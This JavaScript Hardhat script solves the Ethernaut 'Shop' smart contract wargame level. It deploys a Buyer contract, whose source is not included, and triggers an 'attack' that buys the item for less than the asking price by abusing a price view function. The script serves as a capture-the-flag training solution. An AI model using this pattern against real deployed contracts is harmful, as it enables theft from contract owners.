/*
Сan you get the item from the shop for less than the price asked?

  Things that might help:
    Shop expects to be used from a Buyer
    Understanding restrictions of view functions
*/

const hre = require("hardhat");

async function main() {
  [player] = await ethers.getSigners();

  // Get a contract instance of the Shop contract deployed by Ethernaut
  const ShopAddress = "0x7545301CB6186e5E871485b392984e991Cd667A1"
  this.shop = await hre.ethers.getContractAt("Shop",ShopAddress);
  
  // Deploy the Buyer contract
  const Buyer = await hre.ethers.getContractFactory("BuyerContract");
  this.buyer = await Buyer.connect(player).deploy(this.shop.address);
  await this.buyer.deployed();

  console.log(
    `
    Shop address ${await this.shop.address} \n
    Buyer address ${await this.buyer.address} \n
    Price in Shop ${await this.shop.price()} \n
    Price in Buyer ${await this.buyer.price()}
    `
  );


  console.log("\n\n Performing attack ... \n\n");

  // Buying the item for free
  console.log("Buying the item for free ...");

  const buyItemTX = await this.buyer.connect(player).buyItemForFree();
  
  // Await for the buyItemTX to be mined
  console.log("Waiting while we buy the item for free :) ");
  await buyItemTX.wait();

  console.log(
    `
    Price in Shop after the attack ${await this.shop.price()} \n
    `
  );
  
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});